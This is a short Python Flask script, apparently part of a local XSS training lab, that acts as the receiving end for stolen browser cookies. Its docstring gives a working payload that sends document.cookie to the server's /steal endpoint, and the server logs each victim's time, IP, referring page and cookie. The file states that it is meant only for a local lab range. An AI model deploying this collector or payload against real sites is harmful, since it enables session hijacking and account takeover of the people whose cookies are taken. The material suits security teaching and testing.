#!/usr/bin/env python3
"""14 · XSS cookie 窃取接收端：受害者浏览器执行 payload 后把 cookie 送到这里

用法:
    python3 xss_receiver.py [--port 8600]

payload 形如 new Image().src='http://127.0.0.1:8600/steal?c='+document.cookie
——每个回调记录「时间 / 来源 IP / Referer（哪个页面触发的）/ 偷到的 cookie」。
只用于本实验的本地靶场。
"""
import argparse
import time
from pathlib import Path

from flask import Flask, request

app = Flask(__name__)
LOG = Path(__file__).parent / "artifacts" / "receiver.log"


@app.get("/steal")
def steal():
    cookie = request.args.get("c", "")
    line = f"{time.strftime('%H:%M:%S')}\t{request.remote_addr}\t{request.headers.get('Referer', '-')}\t{cookie}"
    LOG.parent.mkdir(exist_ok=True)
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(line + "\n")
    print(f"[receiver] 收到回调 ← {cookie[:100]}", flush=True)
    return "", 204


@app.get("/ping")
def ping():
    return "receiver alive", 200


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8600)
    args = ap.parse_args()
    print(f"[*] 窃取接收端已启动：http://127.0.0.1:{args.port}/steal", flush=True)
    app.run(host="127.0.0.1", port=args.port, debug=False)


if __name__ == "__main__":
    main()
